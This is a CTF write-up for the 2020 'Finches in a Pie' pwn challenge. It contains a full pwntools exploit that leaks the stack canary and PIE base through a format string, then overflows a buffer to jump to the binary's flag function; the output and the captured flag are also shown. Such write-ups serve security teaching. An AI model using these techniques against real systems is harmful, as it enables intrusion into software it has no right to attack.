# Really Awesome CTF 2020

## Finches in a Pie

> 500
>
> Challenge instance ready at `88.198.219.20:41133`
>
> There's a service at ..., exploit it to get the flag.
>
> Author: Ironstone
>
> [`fiap`](fiap)

Tags: _pwn_ _x86_ _rop_ _bof_ _stack-canary_ _format-string_

## Summary

Format-string exploit leaks canary (and base process address) permitting `gets` to _get_ through, redirection execution to `flag`.

This is identical to [fias](https://github.com/datajerk/ctf-write-ups/blob/master/ractf2020/fias/README.md) with a minor change.  Please read that first.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Unlike [fias](https://github.com/datajerk/ctf-write-ups/blob/master/ractf2020/fias/README.md), most mitigations are in place.  In addition to leaking the canary, we'll have to leak the base process address as well.

> Checkout position three in the stack dump from [fias](https://github.com/datajerk/ctf-write-ups/blob/master/ractf2020/fias/README.md).


## Exploit

```
#!/usr/bin/python3

from pwn import *
import sys

#p = process('./fiap')
p = remote('88.198.219.20',43174)

binary = ELF('./fiap')

p.recvuntil('What\'s your name?')
p.sendline('%11$p,%3$p')
p.recvuntil('Thank you, ')
_ = p.recvline().strip().strip(b'!')

# 0x5655628f  →  <say_hi+13> add ebx, 0x2d71
baseproc = int(_.split(b',')[1],16) - binary.symbols['say_hi'] - 13
canary = int(_.split(b',')[0],16)

p.recvuntil('Would you like some cake?')

payload  = (0x29 - 16) * b'A'
payload += p32(canary)
payload += 3 * p32(0x0) # ebx, edi, ebp
payload += p32(baseproc + binary.symbols['flag'])

p.sendline(payload)
p.recvline()
_ = p.recv(100).decode().strip()
print(_)
```

This differs from [fias](https://github.com/datajerk/ctf-write-ups/blob/master/ractf2020/fias/README.md) in that we're leaking two stack parameters: `%11$p,%3$p`, the canary and the address of `say_hi+13`.  With the address of `say_hi` known we can compute the base process address, and then the exploit is the same as before, however we need to add `baseproc` to the address of `flag`.

Output:

```
# ./exploit.py
[+] Opening connection to 88.198.219.20 on port 43174: Done
[*] '/pwd/datajerk/ractf2020/fiap/fiap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
ractf{B4k1ng_4_p1E!}
```

